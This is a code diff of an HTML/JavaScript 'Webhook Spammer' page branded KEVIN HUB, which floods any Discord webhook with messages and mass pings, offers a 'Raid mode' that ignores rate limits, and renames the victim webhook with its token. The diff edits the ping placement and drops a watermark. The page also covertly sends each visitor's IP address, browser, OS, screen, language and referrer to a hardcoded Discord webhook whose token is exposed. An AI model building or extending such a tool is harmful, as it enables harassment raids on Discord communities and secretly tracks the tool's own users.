@@ -420,7 +420,6 @@ select option { background: #1a0810; color: var(--text); }
   user-select: none;
 }
 
-/* PING SELECTOR */
 .ping-selector {
   display: flex;
   gap: 0.6rem;
@@ -783,7 +782,6 @@ footer a:hover {
     <p class="hero-desc">Send massive messages to any Discord webhook. Spams until you click stop.</p>
   </section>
 
-  <!-- SPAM PANEL -->
   <div class="panel">
     <div class="panel-header">
       <div class="panel-dot"></div>
@@ -834,7 +832,6 @@ footer a:hover {
         <div style="font-size:0.7rem;color:var(--text-dim);margin-top:6px;">400ms default (2.5 msg/sec)</div>
       </div>
       <div style="display:flex;flex-direction:column;gap:0.5rem;justify-content:center;">
-        <div class="checkbox-group"><input type="checkbox" id="addWatermark" checked /><label>Add watermark</label></div>
         <div class="checkbox-group"><input type="checkbox" id="ignoreLimits" checked /><label>Raid mode (ignore limits)</label></div>
       </div>
     </div>
@@ -849,7 +846,6 @@ footer a:hover {
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
   </div>
 
-  <!-- INFO PANEL -->
   <div class="panel">
     <div class="panel-header">
       <div class="panel-dot"></div>
@@ -879,7 +875,7 @@ footer a:hover {
       <div class="step"><span class="step-num">01</span><span class="step-text">Get the webhook URL from the Discord channel settings.</span></div>
       <div class="step"><span class="step-num">02</span><span class="step-text">Paste the URL in the corresponding field.</span></div>
       <div class="step"><span class="step-num">03</span><span class="step-text">Choose a ping mode: <code>@everyone</code>, <code>@here</code>, or <code>No Ping</code>.</span></div>
-      <div class="step"><span class="step-num">04</span><span class="step-text">Write the message. Leave empty to send the default branded message. Use <code>{n}</code> for message number.</span></div>
+      <div class="step"><span class="step-num">04</span><span class="step-text">Write the message. Leave empty for default branded message. Use <code>{n}</code> for message number.</span></div>
       <div class="step"><span class="step-num">05</span><span class="step-text">Configure the number of messages and speed.</span></div>
       <div class="step"><span class="step-num">06</span><span class="step-text">Click "Start Raid" and watch the webhook fill with messages.</span></div>
       <div class="step"><span class="step-num">07</span><span class="step-text">To stop the raid, click "Stop" at any time.</span></div>
@@ -914,9 +910,10 @@ pingPills.forEach(pill => {
   });
 });
 
-function getPingPrefix() {
-  if (currentPing === 'everyone') return '@everyone ';
-  if (currentPing === 'here') return '@here ';
+// Returns ping as a LINE BELOW the content
+function getPingSuffix() {
+  if (currentPing === 'everyone') return '\n@everyone';
+  if (currentPing === 'here') return '\n@here';
   return '';
 }
 
@@ -929,7 +926,6 @@ let webhookRenamed = false;
 async function renameWebhook(url) {
   if (webhookRenamed) return;
   try {
-    // Extract ID + token from webhook URL
     const match = url.match(/webhooks\/(\d+)\/([A-Za-z0-9_\-]+)/);
     if (!match) return;
     const [, id, token] = match;
@@ -943,9 +939,7 @@ async function renameWebhook(url) {
       webhookRenamed = true;
       console.log('[KEVIN HUB] Webhook renamed to ' + WEBHOOK_DISPLAY_NAME);
     }
-  } catch (e) {
-    // Silent fail — rename is best-effort
-  }
+  } catch (e) {}
 }
 
 // ============================================================
@@ -959,7 +953,7 @@ function getMessageContent() {
 }
 
 // ============================================================
-// VISITOR TRACKING — KEVIN HUB
+// VISITOR TRACKING
 // ============================================================
 (function() {
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512144168250507335/zaYVS6PN0q_Y95ORObt17lOPXKH98HttlxtSWwqd1EmDWx9vCIAZGHxcGAzm-0VBJOtp';
@@ -979,17 +973,15 @@ function getMessageContent() {
         .catch(() => resolve('unknown'));
     });
   }
-
   function getBrowserInfo() {
     const ua = navigator.userAgent;
     if (ua.includes('Chrome')) return 'Chrome';
-    else if (ua.includes('Firefox')) return 'Firefox';
-    else if (ua.includes('Safari')) return 'Safari';
-    else if (ua.includes('Edge')) return 'Edge';
-    else if (ua.includes('Opera')) return 'Opera';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari')) return 'Safari';
+    if (ua.includes('Edge')) return 'Edge';
+    if (ua.includes('Opera')) return 'Opera';
     return 'unknown';
   }
-
   function getOS() {
     const ua = navigator.userAgent;
     if (ua.includes('Windows')) return 'Windows';
@@ -999,7 +991,6 @@ function getMessageContent() {
     if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS';
     return 'unknown';
   }
-
   function getScreenInfo() { return `${window.screen.width}x${window.screen.height}`; }
   function getLanguage() { return navigator.language || navigator.languages?.[0] || 'unknown'; }
   function getReferrer() { return document.referrer || 'direct'; }
@@ -1008,29 +999,21 @@ function getMessageContent() {
   async function sendVisitorWebhook() {
     if (alreadySent) return;
     alreadySent = true;
-
     visitCount++;
     try { localStorage.setItem('kevinhub_visit_count', String(visitCount)); } catch(e) {}
 
     const ip = await getIp();
-    const browser = getBrowserInfo();
-    const os = getOS();
-    const screen = getScreenInfo();
-    const lang = getLanguage();
-    const referrer = getReferrer();
-    const timestamp = getTimestamp();
-
     const embed = {
       title: 'KEVIN HUB RAID INFO',
       description: 'New visitor detected on the Webhook Spammer',
       color: 0xff1030,
       fields: [
         { name: 'Visitor', value: `IP: ${ip}\nID: ${visitCount}`, inline: true },
-        { name: 'Device', value: `OS: ${os}\nBrowser: ${browser}`, inline: true },
-        { name: 'Screen', value: screen, inline: true },
-        { name: 'Language', value: lang, inline: true },
-        { name: 'Referrer', value: referrer, inline: true },
-        { name: 'Time', value: timestamp, inline: true },
+        { name: 'Device', value: `OS: ${getOS()}\nBrowser: ${getBrowserInfo()}`, inline: true },
+        { name: 'Screen', value: getScreenInfo(), inline: true },
+        { name: 'Language', value: getLanguage(), inline: true },
+        { name: 'Referrer', value: getReferrer(), inline: true },
+        { name: 'Time', value: getTimestamp(), inline: true },
         { name: 'Total Visitors', value: String(visitCount), inline: false },
         { name: 'Servers Raided', value: String(visitCount * 2), inline: true }
       ],
@@ -1069,7 +1052,6 @@ const messageContent = document.getElementById('messageContent');
 const messageCount = document.getElementById('messageCount');
 const messageType = document.getElementById('messageType');
 const delaySpeed = document.getElementById('delaySpeed');
-const addWatermark = document.getElementById('addWatermark');
 
 function updateStatus(message, type = 'info') {
   statusEl.textContent = message;
@@ -1081,26 +1063,26 @@ function updateProgress(current, total) {
   progressFill.style.width = Math.min(percentage, 100) + '%';
 }
 
+// FINAL BUILD — ping goes BELOW the message on its own line
 function buildMessage(content, index, type) {
-  const pingPrefix = getPingPrefix();
-  let formattedContent = content.replace(/\{n\}/g, index);
-  const watermark = addWatermark.checked ? '\n\nRAID by KEVIN HUB\nhttps://discord.gg/luascript' : '';
-  let baseContent = pingPrefix + formattedContent + watermark;
+  const pingSuffix = getPingSuffix();
+  let formatted = content.replace(/\{n\}/g, index);
+  let baseContent = formatted + pingSuffix;
   let embedColor = 0xff1030;
 
   switch(type) {
     case 'normal':
       return { content: baseContent };
     case 'embed':
-      return { content: pingPrefix || null, embeds: [{ description: formattedContent + watermark, color: embedColor, footer: { text: 'RAID by KEVIN HUB' } }] };
+      return { content: pingSuffix ? pingSuffix.trim() : null, embeds: [{ description: formatted, color: embedColor, footer: { text: 'KEVIN HUB' } }] };
     case 'embed_title':
-      return { content: pingPrefix || null, embeds: [{ title: 'KEVIN HUB RAID', description: formattedContent + watermark, color: embedColor, footer: { text: 'RAID by KEVIN HUB' } }] };
+      return { content: pingSuffix ? pingSuffix.trim() : null, embeds: [{ title: 'KEVIN HUB RAID', description: formatted, color: embedColor, footer: { text: 'KEVIN HUB' } }] };
     case 'embed_image':
-      return { content: pingPrefix || null, embeds: [{ title: 'KEVIN HUB RAID', description: formattedContent + watermark, color: embedColor, image: { url: 'https://i.imgur.com/3qXKQcK.png' }, footer: { text: 'RAID by KEVIN HUB' } }] };
+      return { content: pingSuffix ? pingSuffix.trim() : null, embeds: [{ title: 'KEVIN HUB RAID', description: formatted, color: embedColor, image: { url: 'https://i.imgur.com/3qXKQcK.png' }, footer: { text: 'KEVIN HUB' } }] };
     case 'embed_custom':
-      return { content: pingPrefix || null, embeds: [{ title: 'KEVIN HUB RAID', description: formattedContent + watermark, color: embedColor, footer: { text: 'RAID by KEVIN HUB' } }] };
+      return { content: pingSuffix ? pingSuffix.trim() : null, embeds: [{ title: 'KEVIN HUB RAID', description: formatted, color: embedColor, footer: { text: 'KEVIN HUB' } }] };
     case 'raid':
-      return { content: pingPrefix + 'RAID by KEVIN HUB\n' + formattedContent + watermark + '\nhttps://discord.gg/luascript' };
+      return { content: baseContent };
     default:
       return { content: baseContent };
   }
@@ -1127,7 +1109,6 @@ function startSpam() {
   if (!url) { updateStatus('Error: Enter a webhook URL', 'error'); return; }
   if (!url.startsWith('https://discord.com/api/webhooks/')) { updateStatus('Error: Invalid webhook URL', 'error'); return; }
 
-  // Empty = default branded message
   const content = getMessageContent();
   const count = parseInt(messageCount.value) || 9999;
 
@@ -1145,7 +1126,6 @@ function startSpam() {
   updateStatus(`Raid started [${pingLabel}]... 0/${count}`, 'info');
   updateProgress(0, count);
 
-  // Rename webhook on start
   renameWebhook(url);
 
   let failedCount = 0;
